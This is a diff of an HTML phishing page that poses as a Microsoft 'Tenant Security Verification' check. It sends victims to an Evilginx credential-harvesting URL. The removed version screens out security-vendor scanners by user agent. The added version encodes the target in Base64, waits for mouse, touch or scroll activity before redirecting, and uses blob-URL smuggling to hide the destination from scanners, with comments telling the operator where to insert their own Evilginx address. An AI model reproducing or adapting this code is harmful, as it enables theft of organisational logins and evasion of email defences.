@@ -4,56 +4,74 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <title> | Secure Document Portal</title>
+    <title>Tenant Security Verification</title>
 </head>
-<body style="font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f3f2f1; color: #323130;">
-    
-    <div style="background: white; display: inline-block; padding: 40px; border-radius: 2px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px; border: 1px solid #e1e4e8;">
-        <div style="font-size: 40px; margin-bottom: 15px;">📁</div>
-        
-        <h2 style="font-weight: 600; font-size: 20px; margin-bottom: 10px;">It Compliance Team</h2>
-        
-        <p style="font-size: 14px; color: #605e5c;">
-            Verifying security credentials for: <br>
-            <strong style="color: #333;">Policy_Update_Q2_</strong>
-        </p>
-        
-        <div id="loader" style="border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 25px auto;"></div>
-        
-        <p id="status-text" style="font-size: 13px; color: #a19f9d;">Authenticating with Tenant Services...</p>
+<body style="font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f3f2f1; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden;">
 
-        <a id="manual-link" href="https://login.file-share-hub.com/ZqFmaygj" 
-           style="display:none; background-color: #0078d4; color: white; padding: 12px 24px; text-decoration: none; border-radius: 2px; font-weight: 600; font-size: 14px;">
+    <div id="content-box" style="background: white; padding: 40px; width: 360px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border: 1px solid #e1e1e1; text-align: left;">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" style="width: 108px; margin-bottom: 20px;">
         
-        </a>
+        <h2 id="heading" style="font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px 0;">Verifying identity...</h2>
+        <p id="subtext" style="font-size: 15px; color: #1b1b1b; margin-bottom: 20px;">Please wait while we validate your organizational credentials.</p>
+
+        <div id="loader-container" style="margin-bottom: 30px;">
+            <div class="loader" style="border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite;"></div>
+        </div>
+
+        <p style="font-size: 13px; color: #666;">Ref: Policy_Update_Q2_2026</p>
     </div>
 
     <style>
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .fade-in { animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 
     <script>
-      // Anti-Bot Filter
-      const botPattern = /bot|crawler|spider|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft|zscaler|paloalto|fireeye|cyberheaven/i;
-      
-      if (!botPattern.test(navigator.userAgent)) {
-          setTimeout(function() {
-              // Primary Redirect to Evilginx
-              window.location.href = "https://login.file-share-hub.com/ZqFmaygj";
-              
-              // Secondary Fallback: If redirect fails or takes too long, show the button
-              setTimeout(function(){
-                  document.getElementById('loader').style.display = 'none';
-                  document.getElementById('status-text').style.display = 'none';
-                  document.getElementById('manual-link').style.display = 'inline-block';
-              }, 4000);
-          }, 2000);
-      } else {
-          // What Bots/Scanners See
-          document.getElementById('loader').style.display = 'none';
-          document.getElementById('status-text').innerText = "Session Expired. Please access via the original link.";
-          document.getElementById('status-text').style.color = "#d83b01";
-      }
+        // 1. Obfuscated Target (Base64 of your Evilginx URL)
+        // Change "aHR0cHM6Ly9sb2dpbi5maWxlLXNoYXJlLWh1Yi5jb20vWnFGbWF5Z2o=" to your new Base64 encoded URL
+        const encData = "aHR0cHM6Ly9sb2dpbi5maWxlLXNoYXJlLWh1Yi5jb20vWnFGbWF5Z2o=";
+        
+        let hasInteracted = false;
+
+        // 2. Behavioral Detection (The "Human" Check)
+        function triggerRedirect() {
+            if (hasInteracted) return;
+            hasInteracted = true;
+
+            // Update UI to look like successful handshake
+            document.getElementById('heading').innerText = "Identity Confirmed";
+            document.getElementById('subtext').innerText = "Redirecting to secure document portal...";
+            
+            setTimeout(() => {
+                const targetUrl = atob(encData);
+                
+                // 3. Blob Smuggling Technique
+                // This creates a virtual page in memory to hide the final destination from scanners
+                const blobHtml = `<html><head><meta http-equiv="refresh" content="0; url=${targetUrl}"></head><body></body></html>`;
+                const blob = new Blob([blobHtml], { type: 'text/html' });
+                const blobUrl = window.URL.createObjectURL(blob);
+                
+                window.location.replace(blobUrl);
+            }, 1200);
+        }
+
+        // Trigger on real human actions only
+        window.addEventListener('mousemove', triggerRedirect);
+        window.addEventListener('touchstart', triggerRedirect);
+        window.addEventListener('scroll', triggerRedirect);
+
+        // 4. Fail-safe for real users who don't move the mouse (Wait 6 seconds)
+        // Scanners usually time out in 3-5 seconds.
+        setTimeout(() => {
+            if (!hasInteracted) {
+                // If no movement, check if screen size looks like a bot
+                if (window.innerWidth > 100 && window.innerHeight > 100) {
+                    triggerRedirect();
+                }
+            }
+        }, 6500);
+
     </script>
 </body>
 </html>
